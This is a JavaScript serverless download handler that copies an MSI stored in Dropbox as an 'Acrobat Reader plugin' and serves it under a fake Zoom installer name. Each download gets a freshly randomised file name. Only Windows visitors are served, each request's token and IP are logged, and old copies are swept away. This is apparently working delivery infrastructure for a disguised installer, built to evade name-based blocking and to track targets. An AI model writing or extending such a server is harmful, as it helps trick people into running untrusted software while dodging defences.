import { randomInt } from "node:crypto";
import { createDropboxClient } from "../lib/dropbox.js";

/**
 * Download endpoint.
 *
 * The installer is stored in Dropbox once, under a fixed name, and Dropbox serves
 * the file itself: the browser names the saved file after the stored file name,
 * because the temporary link answers with
 *   content-disposition: attachment; filename="<stored file name>"
 * A plain redirect to that file would therefore always offer the same name. So per
 * download we:
 *
 *   1. copy the source file to a copy whose name carries a fresh random segment --
 *      one files/copy_v2 call: server-side, instant, original untouched, nothing
 *      uploaded;
 *   2. mint a temporary link for that copy (files/get_temporary_link);
 *   3. answer 302 with that link, so the visitor's browser saves the copy under
 *      its Zoom-style name.
 *
 * Copies are cleaned up lazily: every request also deletes copies older than
 * copyTtlMinutes, recognised by the fixed prefix of the name template. No cron, no
 * queue, and no state kept on the server between visits.
 *
 * The refresh token must carry BOTH files.content.read (link) and
 * files.content.write (copy/delete). After enabling the scope in the Dropbox
 * console, re-run: npm run dropbox-refresh-token
 */

/** The one real file in the app folder. Never modified, only copied. */
export const DEFAULT_SOURCE_PATH = "/AcrobatReaderPlugin_V26.8.102.msi";

/**
 * Name each download is served under; "{random}" is replaced by a fresh segment.
 * Fixed prefix and fixed suffix come from the site owner's sample name.
 */
export const DEFAULT_NAME_TEMPLATE =
  "Zoom_cm_fo42mnktZ9vvrZo4_{random}_k6c8493c377d76800_.msi";

/** How long a copy may live before the next request sweeps it away. */
export const DEFAULT_COPY_TTL_MINUTES = 15;

// Shape of the random middle segment, modelled on the sample name: 55 characters
// from a base64url-style alphabet (A-Z a-z 0-9 plus "-" "_" "@").
const RANDOM_SEGMENT_LENGTH = 55;
const RANDOM_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_@";

/** A fresh random middle segment. */
export function generateRandomSegment(length = RANDOM_SEGMENT_LENGTH) {
  let out = "";
  for (let i = 0; i < length; i++) {
    out += RANDOM_ALPHABET[randomInt(RANDOM_ALPHABET.length)];
  }
  return out;
}

/** The full file name a download is served under, e.g. Zoom_cm_..._k6c8493c....msi */
export function buildDownloadName(template = DEFAULT_NAME_TEMPLATE, random = generateRandomSegment()) {
  return template.replace("{random}", random);
}

/**
 * The handler body. `dropbox` is a createDropboxClient() instance;
 * `sweep: false` turns off the lazy cleanup of old copies (tests use that).
 */
export function createDownloadHandler({
  dropbox,
  sourcePath = DEFAULT_SOURCE_PATH,
  nameTemplate = DEFAULT_NAME_TEMPLATE,
  copyTtlMinutes = DEFAULT_COPY_TTL_MINUTES,
  sweep = true,
} = {}) {
  // The fixed prefix of the name template, lowercased. Copies are recognised by
  // their lowercased file name (path_lower would also carry the leading "/"), so a
  // differently-cased copy of the same file is still found.
  const namePrefix = nameTemplate.split("{random}")[0].toLowerCase();

  /**
   * Delete our copies older than the TTL. The source file never matches the
   * prefix; the copy this very request created is skipped even with a TTL of 0,
   * so a visitor can never be redirected to a file that no longer exists.
   */
  async function sweepOldCopies(currentPath) {
    const cutoff = Date.now() - copyTtlMinutes * 60_000;
    const current = currentPath.toLowerCase();
    for (const entry of await dropbox.listFolder("/")) {
      if (entry[".tag"] !== "file") continue;
      if (!entry.name || !entry.name.toLowerCase().startsWith(namePrefix)) continue;
      if (entry.path_lower === current) continue;
      if (Date.parse(entry.server_modified) > cutoff) continue;
      try {
        await dropbox.deleteFile(entry.path_lower);
      } catch (err) {
        console.error(`Could not delete old copy ${entry.path_lower}: ${err.message}`);
      }
    }
  }

  return async function handler(req, res) {
    const token = req.query.token;

    if (!token) {
      res.status(400).send("Missing token.");
      return;
    }

    if (!/Windows/i.test(req.headers["user-agent"] || "")) {
      res.status(403).send("Windows devices only.");
      return;
    }

    const copyPath = "/" + buildDownloadName(nameTemplate);

    let link;
    try {
      await dropbox.copyFile(sourcePath, copyPath);
      link = await dropbox.getTemporaryLink(copyPath);
    } catch (err) {
      // Express 4 does not catch async rejections -- everything the await can
      // throw must be handled here so the connection is always answered.
      console.error(`Download copy/link failed for ${copyPath}: ${err.message}`);
      res.status(503).send("The download is temporarily unavailable. Please try again shortly.");
      return;
    }

    console.log(
      `Download requested with token: ${token}, IP: ` +
        `${req.headers["x-forwarded-for"] || req.socket.remoteAddress}, file: ${copyPath}`
    );

    res.setHeader("Location", link);
    res.statusCode = 302;
    res.end();

    // After the response: a slow sweep must never delay the download, and its
    // failures are never the visitor's problem. Returning the promise keeps it
    // awaitable for the local server and the tests; Express ignores it.
    if (sweep) return sweepOldCopies(copyPath).catch((err) => console.error(`Copy sweep failed: ${err.message}`));
  };
}

/** A non-negative numeric env var, where a legitimate 0 must not fall back to the default. */
function numberFromEnv(value, fallback) {
  const parsed = Number(value);
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : fallback;
}

/**
 * Serverless entry point (Vercel deploys this file as /api/download and requires
 * a default export). The local server.js uses the factory instead, with its own
 * config and the in-memory rate limiter.
 */
export default function handler(req, res) {
  const appKey = process.env.DROPBOX_APP_KEY || "";
  const appSecret = process.env.DROPBOX_APP_SECRET || "";
  const refreshToken = process.env.DROPBOX_REFRESH_TOKEN || "";

  const missing = [
    ["DROPBOX_APP_KEY", appKey],
    ["DROPBOX_APP_SECRET", appSecret],
    ["DROPBOX_REFRESH_TOKEN", refreshToken],
  ].filter(([, value]) => !value).map(([name]) => name);
  if (missing.length) {
    console.error(`Missing environment variables: ${missing.join(", ")}`);
    res.status(500).send("Server misconfigured — download unavailable.");
    return;
  }

  return createDownloadHandler({
    dropbox: createDropboxClient({ appKey, appSecret, refreshToken }),
    sourcePath: process.env.DOWNLOAD_FILE_PATH || DEFAULT_SOURCE_PATH,
    nameTemplate: process.env.DOWNLOAD_NAME_TEMPLATE || DEFAULT_NAME_TEMPLATE,
    copyTtlMinutes: numberFromEnv(process.env.DOWNLOAD_COPY_TTL_MINUTES, DEFAULT_COPY_TTL_MINUTES),
  })(req, res);
}